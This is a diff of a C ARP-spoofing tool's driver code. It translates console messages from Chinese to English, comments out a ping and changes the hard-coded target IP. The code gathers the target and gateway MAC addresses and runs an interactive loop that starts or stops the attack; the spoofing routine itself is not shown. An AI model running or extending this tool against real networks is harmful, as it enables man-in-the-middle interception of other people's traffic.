@@ -159,7 +159,7 @@ void arpAttack2(string ifaname, ArpMap *targetArpMap, ArpMap *gatewayArpMap) {
 }
 
 void arpAttack(string targetIp) {
-    printf("0.攻击目标ip %s \n", targetIp);
+    printf("0.attack target ip %s \n", targetIp);
     //获取网卡名
     string ifaname = ifaName();
     printf("1.当前网卡名 %s \n", ifaname);
@@ -167,14 +167,14 @@ void arpAttack(string targetIp) {
     //获取网关地址
     u_byte *ipv4 = gateway();
     string gatewayIp = ip2Str(ipv4);
-    printf("2.网关ip %s %s \n", gatewayIp, Route_Path);
+    printf("2.gateway ip %s %s \n", gatewayIp, Route_Path);
 
     //ping目标ip
-    printf("3.ping %s \n", targetIp);
-    ping(targetIp);
+//    printf("3.ping %s \n", targetIp);
+//    ping(targetIp);
 
     //通过ip获取mac
-    printf("4.获取 arp表信息 %s\n", Arp_Path);
+    printf("4.show arp table %s\n", Arp_Path);
     ArrayList *arpMaps = arpMap();
     ArpMap *targetArpMap = NULL;
     ArpMap *gatewayArpMap = NULL;
@@ -192,27 +192,27 @@ void arpAttack(string targetIp) {
             }
         }
     }
-    printf("5.目标ip mac 信息 \n");
+    printf("5.target ip mac \n");
     printArpMap(targetArpMap);
-    printf("6.网关ip mac 信息 \n");
+    printf("6.gateway ip mac \n");
     printArpMap(gatewayArpMap);
-    printf("完成准备阶段 \n");
+    printf("Complete preparation! \n");
     while (true) {
-        printf("输入指令: 1攻击;2停止; 3退出 \n");
+        printf("command: 1 attack;2 stop; 3 exit \n");
         int num;
         // %f 匹配浮点型数据
         scanf("%d", &num);
         if (num == 1) {
-            printf("开始攻击... ^_^ \n");
+            printf("start attack... ^_^ \n");
             if (stateType == StateType_Stop) {
                 stateType = StateType_Attack;
                 arpAttack2(ifaname, targetArpMap, gatewayArpMap);
             }
         } else if (num == 2) {
-            printf("停止攻击... *_* \n");
+            printf("stop attack... *_* \n");
             stateType = StateType_Stop;
         } else if (num == 3) {
-            printf("退出程序... *_* \n");
+            printf("exit... *_* \n");
             stateType = StateType_Stop;
             cover_sleep(1);
             break;
@@ -231,7 +231,7 @@ void loggerTest() {
 }
 
 int main(int argc, char *argv[]) {
-    arpAttack("10.130.133.78");
+    arpAttack("10.130.134.72");
 //    loggerTest();
 //    interfaceTest();
     return 0;
